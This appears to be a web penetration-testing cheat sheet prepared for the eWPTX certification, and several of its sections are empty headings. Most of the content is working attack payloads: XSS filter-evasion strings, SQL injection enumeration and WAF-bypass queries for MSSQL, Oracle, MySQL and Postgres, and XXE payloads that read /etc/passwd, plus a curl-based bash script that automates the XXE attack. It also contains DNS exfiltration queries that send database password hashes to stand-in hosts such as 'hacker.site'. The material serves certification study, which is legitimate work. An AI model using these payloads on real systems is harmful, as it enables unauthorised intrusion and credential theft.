# eWPTX
List of useful commands for web penetration testing and eWPTX certification

# Table of contents
- Encoding and Filtering
- Evasion Basic
- XSS
- XSS - WAF bypass
- CSRF
- HTML5
- SQLi
- SQLi - WAF evasion
- XXE / XPath
- PHP/Java/.NET deserialization
- SSRF
- XSLT
- Crypto
- Attack SSO / OAuth
- Attack API / Null Origin Exploitation
- Attack LDAP
- Insecure RMI

## HTML5

### CORS
New specification introduced in order to relax the SOP (Same Origin Policy)
Similar to Flash and Silverlight, but instead of XML config files it uses a set of HTTP headers:

- Access-Control-Allow-Origin: indicates wheather the response can be shared with requesting code from the given origin. Possible value are: 
    - * -> For requests without credentials, the value tells browser to allow requesting code from any origin to access resources.
    - origin -> Specifies an origin. Only a single origin can be specified.
    - null 

The CORS misconfiguration allow one host A to access data from another host B.
Sending a malicious link to a victim, that hosts a XHR script that requests some sensitive information, allows the attacker to steal cookies or API keys.
The Access-control-allow-credentials: true header must be implemented too.

## Deserialization

## SSRF

## XSLT
XSLT (Extensible Stylesheet Language Transformations) is a language used in XML document transformations.
The XSL document has an XML-like structure and defines how another XML file should be transformed.
The transformation of an user controlled XML transform this:

```
<?xml version="1.0" ?>
<fruits>
  <fruit>
    <name>Lemon</name>
    <description>Yellow and sour</description>
  </fruit>
  <fruit>
    <name>Watermelon</name>
    <description>Round, green outside, red inside</description>
  </fruit>
</fruits>
```
To this:

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

To exploit this kind of vulnerabilities the user must have the possibility of controlling the XLS file, in order to change the output and eventually read sensitive files or execute system commands.

## Insecure RMI

## XSS
Possibile evasion methods

```
<script <script>>alert('l33t')</script>
```

```
<svg/onload=alert('l33t')>
```

```
<svg><script>alert&lpar;'l33t'&rpar;
```

```
<script>\u0061lert('l33t')</script>
```

```
<script>eval('\x61lert(\'l33t\')')</script>
```

```
<script>eval(8680439..toString(30))(983801..toString(36))</script>
```

## SQLi

### MSSQL

**List version name**

```
SELECT @@VERSION;-- -
```

**List database name**

```
SELECT name FROM master..sysdatabases;-- -
```
```
SELECT name FROM sysdatabases;-- -
```

**List the table of a specific database**

```
S = System Table
U = User Table
TT = Table Type
X = Extended Store Procedure
V = Views
```
```
SELECT name FROM mydatabasename..sysobjects WHERE xtype='U';-- -
```
```
SELECT table_name FROM mydatabasename.INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE';-- -
```

**List all tables and views of the current database**

```
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='BASE TABLE';-- -
```

**List the columns of a specific table**

```
SELECT column_name FROM mydatabasename.INFORMATION_SCHEMA.columns WHERE table_name = '';-- -
```

**List the columns of tables, views and clusters accessible to the current user**

```
SELECT column_name FROM SYS.ALL_TAB_COLUMNS;-- -
```
```
SELECT column_name FROM ALL_TAB_COLUMNS;-- -
```

**List the current user**

```
SELECT loginame FROM SYSPROCESSES WHERE spid = @@SPID;-- -
```

**List all users**

```
SELECT name FROM SYSLOGINS;-- -
```

**List users' privilegs**
The possibile roles are
```
sysadmin
serveradmin
dbcreator
setupadmin
bulkadmin
securityadmin
diskadmin
public
processadmin
```
```
SELECT IS_SRVROLEMEMBER('processadmin', 'myusername');-- -
```
If no username is supplied as an argument, it is the currentuser

**Provoke DNS request**

```
Two alternatives are XP_DIRTREE and XP_SUBDIRS
```
```
EXEC MASTER..XP_FILEEXIST 'C:\Windows\System32\drivers\etc\hosts';-- -
```
```
DECLARE @host varchar(1024);

SELECT @host=(SELECT TOP 1 MASTER.DBO.FN_VARBINTOHEXSTR(password_hash)
FROM SYS.SQL_LOGINS WHERE name='sa') + '.mycollaboratorserver';

EXEC('MASTER..XP_FILEEXIST "\\'+@host+'"');
```

### Oracle

**List database name**

```
SELECT version FROM v$instance;
```
```
SELECT banner FROM v$VERSION WHERE banner LIKE 'oracle%';
```
```
SELECT banner FROM GV$VERSION WHERE banner LIKE 'oracle%';
```

**List tablespace**

```
SELECT DEFAULT_TABLESPACE FROM USER_USERS;
```
```
SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS;
```

**List tables and columns accessible to the current user**

```
SELECT table_name, tablespace_name FROM SYS.all_tables;
```
```
SELECT table_name, tablespace_name FROM all_tables;
```

**List users**

```
SELECT user FROM DUAL;
```
```
SELECT username FROM USER_USERS;
```
```
SELECT username FROM ALL_USERS;
```

**List users' privileges**

```
SELECT grantee FROM DBA_ROLE_PRIVS;
```
```
SELECT username FROM USER_ROLE_PRIVS;
```

**List current users' privileges**

```
SELECT role FROM SESSION_ROLES;
```

**List overview of all the dada dictionary, tables and views available**

```
SELECT * FROM DICTIONARY;
```
```
SELECT * FROM DICT;
```

**Provoke DNS request **

```
SELECT UTIL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacker.site') FROM DUAL;-- -
```
```
SELECT UTIL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacker.site') FROM DUAL;-- -
```

### MySQL

**List database name**

```
SELECT DATABASE();-- -
```

**List the table of a specific database**

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '';-- -
```

**List the table of a specific database with limit and offset**

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '' LIMIT 1 OFFSET N;-- -
```

**List the columns of a specific table and database**

```
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '' AND table_name = '';-- -
```

**List the nth column of a specific table**

```
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '' AND table_name = '' AND ORDINAL_POSITION = N;-- -
```

**Concat query elements when spaces are not allowed**

```
SELECT/**/DATABASE();-- -
```

**Concat query elements when spaces AND comments are not allowed***

```
(SELECT(group_concat(table_name))FROM(INFORMATION_SCHEMA.tables)WHERE(table_schema=database()));-- -
```

**Basic camel case filter evasion**

```
SeLEcT gROup_cOnCaT(TabLE_NamE) FroM InfOrmaTioN_SchEma.TabLeS WhERe tABle_scHEmA =lower('');-- -
```

**Basic evasion if WHERE statement is not allowed**

```
SELECT * FROM GROUP BY HAVING ID=1;-- -
```

**Filter evasion where SQL keywords are not allowed**

```
sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt tZEROFILLaZEROFILLbZEROFILLlZEROFILLe_nZEROFILLaZEROFILLmZEROFILLe fZEROFILLrZEROFILLoZEROFILLm iZEROFILLnZEROFILLfZEROFILLoZEROFILLrZEROFILLmZEROFILLaZEROFILLtZEROFILLiZEROFILLoZEROFILLn_sZEROFILLcZEROFILLhZEROFILLeZEROFILLmZEROFILLa.tZEROFILLaZEROFILLbZEROFILLlZEROFILLeZEROFILLs wZEROFILLhZEROFILLeZEROFILLrZEROFILLe tZEROFILLaZEROFILLbZEROFILLlZEROFILLe_sZEROFILLcZEROFILLhZEROFILLeZEROFILLmZEROFILLa = '';-- -
```

**Letter by letter database enumeration**

```
a' RLIKE (SELECT (
	CASE WHEN(
		ORD( /* string to ASCII conversion /*
			SUBSTRING( /* string, starting index, ending index */
			(
				SELECT IFNULL(CAST(table_name AS NCHAR),0x20)
				FROM INFORMATION_SCHEMA.TABLES
				WHERE table_schema=0x696e666f726d6174696f6e5f736368656d61 LIMIT 2,1
			)
		,11,1)
	)>64 /* check if the ASCII value of a specified letter is bigger than a specified value */
)
THEN 0x61 ELSE 0x28 END))
```

**Read system files (Windows only)**

```
SELECT LOAD_FILE("C:\\Windows\\System32\\drivers\\etc\\hosts");-- -
```

**Provoke DNS request (Windows only)**

```
SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.users WHERE user=\'root\'', '.mycollaboratorserver'));-- -
```

**Other tips**
* Encode query in base64
* Double-encode query in base64
* Use HEX conversion 

### Postgres

**CASE-WHEN secret extraction**

```
(SELECT+CASE+WHEN+((SELECT+substring(password,1,1)+from+users+where+username='USERNAME')='a')+THEN+NULL::text+ELSE+cast+(1/(select+0)+as+text)+END)
```

## XXE


**Basic payload structure**

```
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]> 
    <login>
      <username>&ext;</username>
      <password>BBBB</password>
    </login>
```

**Escape PHP file restriction**

```
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "php://filter/read=convert.base64-encode/resource=FILE-TO-PATH"> ]> 
    <login>
      <username>&ext;</username>
      <password>BBBB</password>
    </login>
```

**Bash script for XXE automation**

Remember to adjust it for the correct target
```
#!/bin/bash

if [ $# -ne 1 ]; then
        echo "Usage $0 <file_path_to_read>"
        exit
fi

XML="<?xml version='1.0'?>
<!DOCTYPE xxe [
   <!ENTITY xxe SYSTEM '$1' >
]>
<login>
   <username>XXEME &xxe;</username>
   <password>password</password>
</login>"

echo -e "==========================================="
echo -e "\t\tSTART"
echo -e "\nExploiting the XXE using the following XML:"
echo $XML | xmllint --nowarning  --format -

echo -e "\n\nResults: ";
curl -s 'http://1.xxe.labs/login.php' --data "$XML" --header "Authxxe:login"

echo -e "\n\n\t\tEND";
echo -e "===========================================";
```
